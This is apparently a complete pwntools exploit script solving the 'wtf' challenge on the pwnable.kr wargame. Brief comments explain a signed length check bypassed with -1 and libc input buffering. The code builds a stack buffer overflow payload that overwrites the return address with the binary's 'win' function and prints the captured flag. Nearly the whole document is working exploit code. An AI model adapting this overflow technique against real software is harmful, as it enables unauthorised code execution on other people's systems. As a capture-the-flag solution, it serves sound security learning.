#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9015 wtf.py
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("wtf")
wrapper = './wtf.py'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 9015)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([wrapper] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

import binascii

context.terminal = ["kitty"]

exe = ELF("wtf")

# pretty easy - the overflow check is signed thus can be easily bypassed with -1
# the real "problem" here is that the length is read using fgets with uses libc read functions
# which buffer file data. thus, it actually consumes 4096 bytes in any case. later we read the buffer
# using my_fgets which does raw `read`s thus will read from offset 4096.

io = start()

payload = b"-1".ljust(4096, b"A")   # fake length + libc buffering
payload += cyclic(0x38)             # padding
payload += p64(exe.sym["win"] + 4)  # avoid mov rsp, rbp since we just overwrote rbp to some random value.

assert b"\n" not in payload
payload += b"\n"

io.sendlineafter(b"payload please : ", binascii.hexlify(payload))

io.recvuntil(b"hey! your payload got me this : ")

success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")